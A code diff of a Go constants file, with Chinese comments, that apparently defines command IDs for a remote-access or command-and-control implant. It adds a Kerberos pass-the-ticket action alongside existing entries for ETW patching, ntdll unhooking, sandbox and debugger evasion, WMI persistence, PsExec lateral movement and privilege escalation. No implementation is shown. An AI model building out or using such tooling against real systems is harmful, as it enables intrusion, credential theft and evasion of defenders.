@@ -101,14 +101,14 @@ const (
 	INJECT        = 112 // 进程注入
 
 	// A1-A7 客户端能力增强
-	ETW_PATCH      = 113 // ETW 补丁（屏蔽遥测）
-	UNHOOK_NTDLL   = 114 // ntdll unhooking
-	SANDBOX_CHECK  = 115 // 沙箱检测
-	ANTIDEBUG      = 116 // 反调试检查
-	WMI_PERSIST    = 117 // WMI 无文件持久化（add|remove|list）
-	PSEXEC         = 118 // 横向移动：远程执行（target|user|pass|cmd）
-	AD_ENUM        = 119 // 域信息收集
-	SELF_UPDATE    = 120 // 客户端自我更新
+	ETW_PATCH     = 113 // ETW 补丁（屏蔽遥测）
+	UNHOOK_NTDLL  = 114 // ntdll unhooking
+	SANDBOX_CHECK = 115 // 沙箱检测
+	ANTIDEBUG     = 116 // 反调试检查
+	WMI_PERSIST   = 117 // WMI 无文件持久化（add|remove|list）
+	PSEXEC        = 118 // 横向移动：远程执行（target|user|pass|cmd）
+	AD_ENUM       = 119 // 域信息收集
+	SELF_UPDATE   = 120 // 客户端自我更新
 	// 删除进程文件并退出（"删除客户端"流程）
 	SELFDELETE_EXIT = 121 // 客户端退出并删除自身二进制
 
@@ -146,4 +146,9 @@ const (
 	// cmdBuf = "" | "auto" | "token" | "uac" | "uac_cleanup"。
 	// 只派生**新会话**（不改当前进程的令牌模拟状态）：成功与否都不影响已有会话。
 	GETSYSTEM = 132
+
+	// Kerberos 票据动作（阶段三，须与服务端 pkg/command/cmdType.go 一致）：
+	// cmdBuf = "list" | "purge [服务名]" | "ptt <base64 的 kirbi>"。
+	// 采集走制品管线（kind=ticket），动作走命令回显。
+	KERB_ACTION = 133
 )
